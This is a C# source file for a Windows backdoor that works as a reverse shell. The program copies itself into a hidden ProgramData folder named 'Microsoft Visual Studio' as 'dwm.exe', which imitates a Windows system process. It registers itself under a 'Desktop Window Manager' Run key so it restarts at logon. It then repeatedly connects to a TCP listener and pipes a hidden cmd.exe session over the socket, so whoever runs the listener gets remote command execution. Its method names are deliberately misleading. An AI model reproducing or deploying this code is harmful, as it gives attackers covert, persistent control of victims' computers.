using System;
using System.IO;
using System.Reflection;
using System.Text;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using Microsoft.Win32;

namespace Client
{
    class MachiMarket
    {
        public static Process conhost = null;
        public static TcpClient server = null;
        public static StreamWriter server_out = null;

        public static void Larkana()
        {
            if (conhost != null)
            {
                conhost.Kill();
                conhost = null;
            }
        }
        public static void Karachi()
        {
            if(conhost != null)
            {
                Larkana();
            }

            conhost = new Process();
            conhost.StartInfo.FileName = "cmd.exe";
            conhost.StartInfo.CreateNoWindow = true;
            conhost.StartInfo.UseShellExecute = false;
            conhost.StartInfo.RedirectStandardOutput = true;
            conhost.StartInfo.RedirectStandardInput = true;
            conhost.StartInfo.RedirectStandardError = true;

            conhost.OutputDataReceived += (a, e) =>
            {
                StringBuilder strOutput = new StringBuilder();
                if (!String.IsNullOrEmpty(e.Data))
                {
                    try
                    {
                        strOutput.Append(e.Data);
                        if (server_out != null)
                        {
                            server_out.WriteLine(strOutput);
                            server_out.Flush();
                        }
                    }
                    catch (Exception) { }
                }
            };

            conhost.ErrorDataReceived += (a, e) =>
            {
                StringBuilder strOutput = new StringBuilder();
                if (!String.IsNullOrEmpty(e.Data))
                {
                    try
                    {
                        strOutput.Append(e.Data);
                        if (server_out != null)
                        {
                            server_out.WriteLine(strOutput);
                            server_out.Flush();
                        }
                    }
                    catch (Exception) { }
                }
            };

            conhost.Start();
            conhost.BeginOutputReadLine();
            conhost.BeginErrorReadLine();
        }

        public static void Main()
        {
            try
            {
                if (Directory.GetCurrentDirectory() != Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Microsoft Visual Studio"))
                {
                    if(!Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Microsoft Visual Studio")))
                    {
                        var di = Directory.CreateDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Microsoft Visual Studio"));
                        di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                    }

                    DirectoryInfo directory = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Microsoft Visual Studio"));
                    
                    if ((directory.Attributes & FileAttributes.Hidden) != FileAttributes.Hidden)
                    {
                        directory.Attributes = directory.Attributes | FileAttributes.Hidden;
                    }

                    if(File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Microsoft Visual Studio", "dwm.exe")))
                    {
                        File.SetAttributes(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Microsoft Visual Studio", "dwm.exe"), FileAttributes.Hidden);
                        File.Delete(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Microsoft Visual Studio", "dwm.exe"));
                    }
                    File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Microsoft Visual Studio", "dwm.exe"), true);
                    File.SetAttributes(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Microsoft Visual Studio", "dwm.exe"), FileAttributes.ReadOnly | FileAttributes.Hidden);

                    var proc = new Process();
                    proc.StartInfo.FileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Microsoft Visual Studio", "dwm.exe");
                    proc.StartInfo.CreateNoWindow = true;
                    proc.StartInfo.WorkingDirectory = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Microsoft Visual Studio");
                    proc.StartInfo.UseShellExecute = true;
                    proc.Start();
                    return;
                }

                if (Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Desktop Window Manager", "null") == "null"
                    || Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Desktop Window Manager", "null") != System.Reflection.Assembly.GetExecutingAssembly().Location)
                {
                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                    {
                        key.SetValue("Desktop Window Manager", System.Reflection.Assembly.GetExecutingAssembly().Location);
                    }
                }
            }
            catch { }

            string ip = "127.0.0.1";
            int port = 8346;

            while (true)
            {
                Larkana();
                try
                {
                    using (server = new TcpClient(ip, port))
                    {
                        using (Stream stream = server.GetStream())
                        {
                            Karachi();
                            using (StreamReader server_in = new StreamReader(stream))
                            {
                                server_out = new StreamWriter(stream);

                                while (server.Connected) { conhost.StandardInput.WriteLine(server_in.ReadLine()); }
                            }

                            Larkana();
                        }
                    }
                    Larkana();
                    System.Threading.Thread.Sleep(3000);
                }
                catch {
                    Larkana();
                    System.Threading.Thread.Sleep(3000);
                }
            }
        }
    }
}